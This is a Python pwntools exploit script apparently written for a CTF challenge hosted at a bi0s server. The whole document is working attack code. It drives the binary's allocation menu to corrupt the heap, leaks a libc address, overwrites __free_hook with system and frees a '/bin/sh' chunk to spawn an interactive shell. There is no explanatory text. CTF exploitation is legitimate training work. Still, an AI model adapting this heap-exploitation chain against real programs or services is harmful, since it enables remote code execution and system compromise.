#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("pwn.challenge.bi0s.in", 1299)

def s(a,b):
    r.sendafter(a,b)

def sl(a,b):
    r.sendlineafter(a,b)

def alloc(index, size, path=b""):
    print("alloc of size " + hex(size))
    sl("Choice >> ", "1")
    sl(">> ", str(index))
    sl(">> ", str(size))
    if path:
        sl(">> ", path)
    else:
        sl(">> ", str(index)*(size-1))


def free(index):
    print("free " + str(index))
    sl(">> ", "4")
    sl(">> ", str(index))

def check(index):
    sl("Choice >> ", "2")
    sl(">> ", str(index))

def view(index):
    sl("Choice >> ", "3")
    sl(">> ", str(index))


def main():
    
    data = b'~\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xf7xconfig=x\xff\xfflism`inr;oxseLinuxfsy3sswordSSS%S\\output-fSS=x\xff\xfflism`inr;oxseLinuxfsy3sswordSSQSSSSS%S\\SSSSSSSSSSSxy=y:n////////////////////////S\\SSSSSSSSSSS/xSSSSSSS%S\\SSSSSSSSSSS///////oy=y:no-proxSSSSSSS%S\\SSSSSSSSSSSxyy:no-proxSSSSSSS%S\\SSSSSSSSSSSxy=yxy=y:n///////////////SSmS%S\\SSSSSSSSSSS///////oy=y:no\1\x61\x04/M\0//mainru\x00'
    
    spray = (p64(0) + p64(0x21))*(0x148//0x10)
    alloc(0, 0x1000, data) #0
    alloc(1, 0x148)
    alloc(2, 0x88)
    alloc(3, 0xa0) # bridge
    alloc(4, 0x200)
    alloc(5, 0x148)
    alloc(6, 0x148, spray)

    #alloc(7, 0x1000, spray)

    free(1)
    free(2)

    check(0)
        
    free(4)
    
    alloc(7, 0x200)
    


    view(5)
    r.recvuntil("[+] Path : ")
    libc_leak = u64(r.recv(6).ljust(8, p8(0)))
    log.info("Libc leak @ 0x%x", libc_leak)
    
    libc_base = libc_leak - 0x1ebbe0
    log.info("Libc base @ 0x%x", libc_base)

    free(6) 
    
    free_hook = libc_base + 0x1eeb28
    system = libc_base + 0x55410

    alloc(8, 0x240, p8(0)*(0xb0+0xa0) + p64(free_hook)*2)
    
    alloc(9, 0x148, b"/bin/sh\x00")
    alloc(10, 0x148, p64(system))
    
    free(9)
    
    r.interactive()


if __name__ == "__main__":
    main()
